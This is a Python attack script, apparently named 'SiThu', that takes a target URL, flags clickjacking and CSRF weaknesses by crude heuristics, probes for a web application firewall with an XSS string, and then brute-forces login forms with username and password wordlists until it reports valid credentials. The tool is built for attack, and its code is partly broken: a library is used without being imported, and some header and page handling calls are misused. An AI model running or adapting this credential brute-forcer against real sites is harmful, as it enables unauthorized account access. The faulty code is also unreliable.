#!/usr/bin/env python3
# Modules
import mechanize
import itertools
import sys
from bs4 import BeautifulSoup
from urllib.request import urlopen
from urllib.error import URLError

# MechanicalSoup browser setup
browser = mechanicalsoup.StatefulBrowser()
browser.set_user_agent('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')

# Banner
print('''\033[1;93m
 ____  _ _____ _
/ ___|(_)_   _| |__  _   _
\___ \| | | | | '_ \| | | |
 ___) | | | | | | | | |_| |
|____/|_| |_| |_| |_|\__,_|
\033[1;34m
''')

# Get target URL
url = input('\033[1;34m[?]\033[0m Enter target URL: ')
if 'http://' not in url and 'https://' not in url:
    url = 'http://' + url

# Open URL
try:
    browser.open(url)
except URLError:
    url = 'https://' + url
    browser.open(url)

# Get headers
headers = str(browser.get_url()).lower()
if 'x-frame-options:' not in headers:
    print('\033[1;32m[+]\033[0m Heuristic found a Clickjacking Vulnerability')
if 'cloudflare-nginx' in headers:
    print('\033[1;31m[-]\033[0m Target is protected by Cloudflare')

data = browser.get_current_page().decode('utf-8')
if 'type="hidden"' not in data:
    print('\033[1;32m[+]\033[0m Heuristic found a CSRF Vulnerability')

soup = BeautifulSoup(data, 'html.parser')
i_title = soup.find('title')
original = i_title.contents if i_title else None

# WAF detection function
def WAF_detector():
    noise = "?=<script>alert()</script>"
    fuzz = url + noise
    try:
        res1 = urlopen(fuzz)
        if res1.code == 406 or res1.code == 501:
            print("\033[1;31m[-]\033[1;m WAF Detected : Mod_Security")
        elif res1.code == 999:
            print("\033[1;31m[-]\033[1;m WAF Detected : WebKnight")
        elif res1.code == 419:
            print("\033[1;31m[-]\033[1;m WAF Detected : F5 BIG IP")
        elif res1.code == 403:
            print("\033[1;31m[-]\033[1;m Unknown WAF Detected")
    except URLError as e:
        print("\033[1;31m[-]\033[0m Error detecting WAF:", e)

WAF_detector()

# Load wordlists
def wordlist_u(lst):
    try:
        with open('usernames.txt', 'r') as f:
            for line in f:
                lst.append(line.strip())
    except IOError:
        print("\033[1;31m[-]\033[1;m Wordlist not found!")
        quit()

def wordlist_p(lst):
    try:
        with open('passwords.txt', 'r') as f:
            for line in f:
                lst.append(line.strip())
    except IOError:
        print("\033[1;31m[-]\033[1;m Wordlist not found!")
        quit()

usernames = []
wordlist_u(usernames)
print('\033[1;97m[>]\033[1;m Usernames loaded: %i' % len(usernames))
passwords = []
wordlist_p(passwords)
print('\033[1;97m[>]\033[1;m Passwords loaded: %i' % len(passwords))

# Find and brute force forms
def find():
    forms = browser.get_current_page().find_all('form')
    form_number = 0
    for f in forms:
        username = f.find('input', {'type': 'text'})
        password = f.find('input', {'type': 'password'})
        if username and password:
            print('\033[1;33m[!]\033[0m Username field:', username['name'])
            print('\033[1;33m[!]\033[0m Password field:', password['name'])
            brute(username['name'], password['name'], form_number)
            form_number += 1
        else:
            form_number += 1
    print('\033[1;31m[-]\033[0m No forms found')

def brute(username, password, form_number):
    for uname in usernames:
        print('\033[1;97m[>]\033[1;m Bruteforcing username:', uname)
        for i, passwd in enumerate(passwords, 1):
            sys.stdout.write('\r\033[1;97m[>]\033[1;m Passwords tried: %i / %i' % (i, len(passwords)))
            sys.stdout.flush()
            browser.open(url)
            browser.select_form(nr=form_number)
            browser[username] = uname
            browser[password] = passwd
            resp = browser.submit_selected()
            data = resp.text
            if 'username or password' not in data.lower():
                print('\n\033[1;32m[+]\033[0m Valid credentials found:')
                print('\033[1;32mUsername: \033[0m' + uname)
                print('\033[1;32mPassword: \033[0m' + passwd)
                quit()
    print('\033[1;31m[-]\033[0m Failed to crack login credentials')

find()
    
